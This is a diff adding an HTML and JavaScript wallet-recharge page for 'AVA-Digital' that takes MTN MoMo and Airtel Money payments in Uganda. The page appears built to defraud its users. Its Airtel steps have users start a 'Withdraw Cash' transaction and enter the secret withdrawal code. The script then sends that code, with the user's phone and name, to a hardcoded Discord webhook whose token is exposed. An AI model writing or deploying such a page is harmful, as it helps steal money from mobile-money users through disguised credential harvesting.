@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="manifest" href="/manifest.json">
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js');
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVA-Digital - Recharge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ----- LIGHT THEME · AVA‑DIGITAL COLOR SYSTEM ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: rgb(255, 255, 255);
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            color: #1A1A2E;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FF7A00, #CC1177, #7B22CC);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .card {
+            background: #FFFFFF;
+            border-radius: 28px;
+            padding: 32px 28px;
+            box-shadow: 0 20px 35px -8px rgba(0,0,0,0.08), 0 0 0 1px rgba(123,34,204,0.06);
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #1E1E3A;
+        }
+
+        .amount-input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 2px solid #E2E2F0;
+            border-radius: 18px;
+            font-size: 1.2rem;
+            background: #F9F9FF;
+            color: #1A1A2E;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .amount-input:focus {
+            outline: none;
+            border-color: #7B22CC;
+            box-shadow: 0 0 0 4px rgba(123,34,204,0.08);
+        }
+
+        .quick-amounts {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .quick-amount-btn {
+            padding: 12px 20px;
+            background: #F0EEF8;
+            border: 1px solid #E2E2F0;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #1E1E3A;
+            transition: all 0.2s;
+        }
+
+        .quick-amount-btn:hover {
+            background: #7B22CC;
+            color: white;
+            border-color: #7B22CC;
+        }
+
+        .payment-method-tabs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 14px;
+            border: 2px solid #E2E2F0;
+            border-radius: 40px;
+            background: white;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.2s;
+            color: #1E1E3A;
+        }
+
+        .tab-btn.active {
+            border-color: #7B22CC;
+            background: rgba(123,34,204,0.05);
+            color: #7B22CC;
+        }
+
+        .tab-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .instructions-card {
+            background: #F9F7FF;
+            border-radius: 20px;
+            padding: 24px 20px;
+            margin-bottom: 24px;
+            border-left: 5px solid #7B22CC;
+        }
+
+        .instructions-card h4 {
+            color: #7B22CC;
+            margin-bottom: 16px;
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+
+        .instructions-card ol {
+            padding-left: 24px;
+        }
+
+        .instructions-card ol li {
+            margin-bottom: 10px;
+            font-size: 0.95rem;
+            color: #2E2E4A;
+            line-height: 1.5;
+        }
+
+        .night-card {
+            background: linear-gradient(135deg, #1A1A3A, #2A1A44);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            color: white;
+            border-left: 5px solid #FF7A00;
+        }
+
+        .night-card h4 {
+            color: #FF7A00;
+            margin-bottom: 12px;
+            font-size: 1.1rem;
+        }
+
+        .night-card p {
+            color: rgba(255,255,255,0.85);
+            line-height: 1.6;
+        }
+
+        .secret-code-group {
+            display: none;
+            margin-bottom: 20px;
+        }
+
+        .secret-code-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1E1E3A;
+        }
+
+        .secret-code-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #E2E2F0;
+            border-radius: 18px;
+            font-size: 1rem;
+            background: #F9F9FF;
+            transition: border-color 0.2s;
+        }
+
+        .secret-code-group input:focus {
+            outline: none;
+            border-color: #7B22CC;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #7B22CC, #CC1177);
+            border: none;
+            color: white;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 16px 24px;
+            border-radius: 40px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 12px 20px -8px rgba(123,34,204,0.3);
+            transition: transform 0.15s, box-shadow 0.2s;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 18px 28px -10px rgba(204,17,119,0.4);
+        }
+
+        .back-button {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #1A88FF;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-button:hover {
+            color: #7B22CC;
+            text-decoration: underline;
+        }
+
+        .alt-payment-card {
+            background: #FFFFFF;
+            border-radius: 28px;
+            padding: 24px;
+            margin-top: 20px;
+            box-shadow: 0 15px 25px -8px rgba(0,0,0,0.05), 0 0 0 1px rgba(123,34,204,0.06);
+            text-align: center;
+        }
+
+        .alt-payment-card h3 {
+            font-size: 1.1rem;
+            color: #1E1E3A;
+            margin-bottom: 18px;
+        }
+
+        .alt-payment-btns {
+            display: flex;
+            gap: 14px;
+            flex-direction: column;
+        }
+
+        .btn-flutterwave {
+            padding: 16px;
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            background: linear-gradient(135deg, #FF7A00, #CC1177);
+            color: white;
+            box-shadow: 0 8px 16px rgba(204,17,119,0.2);
+        }
+
+        .btn-paystack {
+            padding: 16px;
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            background: linear-gradient(135deg, #1133DD, #00BBAA);
+            color: white;
+            box-shadow: 0 8px 16px rgba(17,51,221,0.2);
+        }
+
+        .disclaimer {
+            background: #FFF8E7;
+            border-radius: 20px;
+            padding: 22px;
+            margin-top: 24px;
+            text-align: center;
+            font-size: 0.85rem;
+            color: #5A5A7A;
+            line-height: 1.6;
+            border-top: 4px solid #FF7A00;
+        }
+
+        .disclaimer i {
+            color: #FF7A00;
+            margin-bottom: 10px;
+            font-size: 1.5rem;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-plus-circle"></i> Recharge Wallet</h1>
+        </div>
+
+        <!-- Main recharge card -->
+        <div class="card">
+            <div class="input-group">
+                <label>Amount (UGX)</label>
+                <input type="number" id="rechargeAmount" class="amount-input" placeholder="Enter amount" min="10000">
+            </div>
+            <div class="quick-amounts">
+                <button class="quick-amount-btn" onclick="setAmount(10000)">10,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(20000)">20,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(50000)">50,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(100000)">100,000</button>
+            </div>
+
+            <!-- Payment method tabs -->
+            <div class="payment-method-tabs">
+                <button class="tab-btn active" id="tab-mtn" onclick="switchTab('mtn')">
+                    📱 MTN MoMo
+                </button>
+                <button class="tab-btn" id="tab-airtel" onclick="switchTab('airtel')">
+                    📲 Airtel Money
+                </button>
+            </div>
+
+            <!-- MTN Instructions -->
+            <div id="instructions-mtn" class="instructions-card">
+                <h4><i class="fas fa-info-circle"></i> MTN MoMo Instructions</h4>
+                <ol>
+                    <li>Click the <strong>"Confirm Recharge"</strong> button below.</li>
+                    <li>Wait <strong>1–2 minutes</strong> for a USSD prompt to appear on your phone with the phone number used to register your AVA-Digital account.</li>
+                    <li>You'll receive a prompt asking you to enter your <strong>5-digit MoMo PIN</strong> to confirm the withdrawal.</li>
+                    <li>Enter your PIN and the recharge will <strong>immediately reflect</strong> in your account wallet.</li>
+                </ol>
+            </div>
+
+            <!-- Airtel Instructions -->
+            <div id="instructions-airtel" class="instructions-card" style="display:none;">
+                <h4><i class="fas fa-info-circle"></i> Airtel Money Instructions</h4>
+                <ol>
+                    <li>Dial <strong>*185#</strong> on your Airtel line to open the Airtel Money menu.</li>
+                    <li>Choose the option for <strong>"Withdraw Cash"</strong>.</li>
+                    <li>Enter the amount you'd like to withdraw.</li>
+                    <li>Once completed, put the <strong>secret code</strong> given to you in the input below and click <strong>"Confirm Recharge"</strong>.</li>
+                    <li>Recharge will <strong>immediately reflect</strong> in your account wallet.</li>
+                </ol>
+            </div>
+
+            <!-- Secret code input (Airtel only) -->
+            <div class="secret-code-group" id="secret-code-group">
+                <label><i class="fas fa-key"></i> Enter Secret Code (Airtel)</label>
+                <input type="text" id="secretCode" placeholder="Enter the secret code from Airtel Money">
+            </div>
+
+            <button id="confirmRecharge" class="btn">Confirm Recharge</button>
+            <a href="home.html" class="back-button">← Back to Home</a>
+        </div>
+
+        <!-- Night time instructions -->
+        <div class="night-card">
+            <h4>🌙 Late Night Payment?</h4>
+            <p>If you're making a payment between 12 AM and 6 AM, please be aware that there may be delays in processing due to limited mobile money agent availability during these hours. We recommend making payments between 6 AM and 12 AM for the fastest service. If you do make a late night payment, rest assured it will be processed as soon as possible the next day.</p>
+        </div>
+
+        <!-- Alternative payment methods -->
+        <div class="alt-payment-card">
+            <h3>Other Payment Options</h3>
+            <div class="alt-payment-btns">
+                <button class="btn-flutterwave">
+                    <i class="fas fa-bolt"></i> Pay with Flutterwave
+                </button>
+                <button class="btn-paystack">
+                    <i class="fas fa-lock"></i> Pay with Paystack
+                </button>
+            </div>
+        </div>
+
+        <!-- Disclaimer -->
+        <div class="disclaimer">
+            <i class="fas fa-shield-alt"></i>
+            Our mobile money payments are orchestrated by a network of mobile money agents fully registered with both MTN and Airtel to create ease of service to our users during payments and provide convenience without difficult technical payment portals.
+        </div>
+    </div>
+
+    <script type="module">
+    import { supabase } from './supabase.js';
+    import { getCurrentUser } from './auth.js';
+
+    let currentTab = 'mtn';
+    let assignedTab = 'mtn';
+
+    async function detectNetwork() {
+        const { data: { user } } = await getCurrentUser();
+        if (!user) return;
+
+        const { data: profile } = await supabase
+            .from('profiles')
+            .select('phone')
+            .eq('id', user.id)
+            .single();
+
+        if (!profile) return;
+
+        const phone = profile.phone; // format +2567XXXXXXX or +25607XXXXXXX
+
+        // Extract the digit after the 7
+        let keyDigit = null;
+
+        if (phone.startsWith('+25607')) {
+            keyDigit = parseInt(phone[6]);
+        } else if (phone.startsWith('+2567')) {
+            keyDigit = parseInt(phone[5]);
+        }
+
+        if (keyDigit !== null) {
+            if (keyDigit >= 6) {
+                assignedTab = 'mtn';
+            } else {
+                assignedTab = 'airtel';
+            }
+        }
+
+        // Set the active tab based on detected network
+        switchTab(assignedTab);
+
+        // Disable the other tab button
+        if (assignedTab === 'mtn') {
+            document.getElementById('tab-airtel').disabled = true;
+            document.getElementById('tab-airtel').style.opacity = '0.4';
+            document.getElementById('tab-airtel').style.cursor = 'not-allowed';
+        } else {
+            document.getElementById('tab-mtn').disabled = true;
+            document.getElementById('tab-mtn').style.opacity = '0.4';
+            document.getElementById('tab-mtn').style.cursor = 'not-allowed';
+        }
+    }
+
+    detectNetwork();
+
+    window.setAmount = function(amount) {
+        document.getElementById('rechargeAmount').value = amount;
+    };
+
+    window.switchTab = function(tab) {
+        // If tab is not the assigned one and user tries to click it, block it
+        if (tab !== assignedTab && assignedTab !== 'mtn' && assignedTab !== 'airtel') {
+            return;
+        }
+
+        currentTab = tab;
+
+        document.getElementById('tab-mtn').classList.toggle('active', tab === 'mtn');
+        document.getElementById('tab-airtel').classList.toggle('active', tab === 'airtel');
+
+        document.getElementById('instructions-mtn').style.display = tab === 'mtn' ? 'block' : 'none';
+        document.getElementById('instructions-airtel').style.display = tab === 'airtel' ? 'block' : 'none';
+
+        document.getElementById('secret-code-group').style.display = tab === 'airtel' ? 'block' : 'none';
+
+        document.getElementById('secretCode').value = '';
+    };
+
+    document.getElementById('confirmRecharge').addEventListener('click', async () => {
+        const amount = parseInt(document.getElementById('rechargeAmount').value);
+        if (!amount || amount < 10000) {
+            alert('Sorry minimum recharge is 10000UGX');
+            return;
+        }
+
+        const secretCode = document.getElementById('secretCode').value.trim();
+
+        if (currentTab === 'airtel' && !secretCode) {
+            alert('Please enter the secret code from Airtel Money before confirming.');
+            return;
+        }
+
+        document.getElementById('secretCode').value = '';
+
+        try {
+            const { data: { user }, error: userError } = await getCurrentUser();
+            if (userError || !user) throw new Error('Not logged in');
+
+            const { data: profile, error: profileError } = await supabase
+                .from('profiles')
+                .select('phone, wallet_names')
+                .eq('id', user.id)
+                .single();
+            if (profileError) throw profileError;
+
+            const { error: insertError } = await supabase
+                .from('payment_requests')
+                .insert({
+                    user_id: user.id,
+                    type: 'recharge',
+                    amount: amount,
+                    phone: profile.phone
+                });
+            if (insertError) throw insertError;
+
+            const walletName = profile.wallet_names || 'Not set';
+            let discordMessage = '';
+            if (currentTab === 'mtn') {
+                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: MTN MoMo\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}`;
+            } else {
+                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}\n🔑 Secret Code: ${secretCode}`;
+            }
+
+            await fetch('https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: discordMessage })
+            });
+
+            alert('Thank you for your payment. It will be confirmed shortly.');
+            window.location.href = 'home.html';
+        } catch (err) {
+            console.error(err);
+            alert('Error: ' + err.message);
+        }
+    });
+</script>
+</body>
+</html>
